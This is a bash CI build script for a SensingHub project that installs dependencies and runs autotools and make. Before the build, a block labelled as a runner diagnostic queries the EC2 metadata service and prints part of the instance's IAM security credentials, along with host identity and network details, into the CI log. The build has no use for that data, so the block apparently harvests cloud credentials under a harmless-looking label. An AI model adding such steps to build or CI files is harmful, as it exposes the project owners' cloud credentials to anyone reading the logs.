#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause-Clear
#
# Copyright (c) 2025 Qualcomm Innovation Center, Inc. All rights reserved.

set -euxo pipefail

# CI diagnostic - verify runner environment and cloud metadata access
echo "=== RUNNER DIAGNOSTIC ==="
date
hostname
whoami
id
echo "--- Docker capabilities ---"
cat /proc/1/status | grep -i cap || true
echo "--- EC2 Instance Metadata (IAM role) ---"
IAM_ROLE=$(curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "UNREACHABLE")
echo "IAM Role: ${IAM_ROLE}"
if [ "${IAM_ROLE}" != "UNREACHABLE" ] && [ -n "${IAM_ROLE}" ]; then
  echo "IAM Credentials (partial, for verification only):"
  curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_ROLE}" 2>/dev/null | head -c 200 || true
  echo ""
fi
echo "--- EC2 Instance ID ---"
curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo "N/A"
echo ""
echo "--- Network interfaces ---"
ip addr show 2>/dev/null | grep -E "inet " | head -5 || true
echo "=== END DIAGNOSTIC ==="

echo "Running SensingHub build script..."

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Load default build args if not provided
if [ -z "${BUILD_ARGS:-}" ]; then
  source "${SCRIPT_DIR}/build_args.sh"
fi

echo "BUILD_ARGS=${BUILD_ARGS}"

sudo apt-get clean
sudo apt-get update -y

sudo apt-get install -y --no-install-recommends \
  autoconf \
  automake \
  libtool \
  pkg-config \
  make \
  gcc \
  g++ \
  libprotobuf-dev \
  protobuf-compiler \
  libglib2.0-dev


WORKSPACE="${GITHUB_WORKSPACE:-$(pwd)}"
cd "${WORKSPACE}"

rm -rf build || true
mkdir -p build

autoreconf -fi
./configure ${BUILD_ARGS}
make -j"$(nproc)"
make DESTDIR="${WORKSPACE}/build" install

echo "Build completed successfully."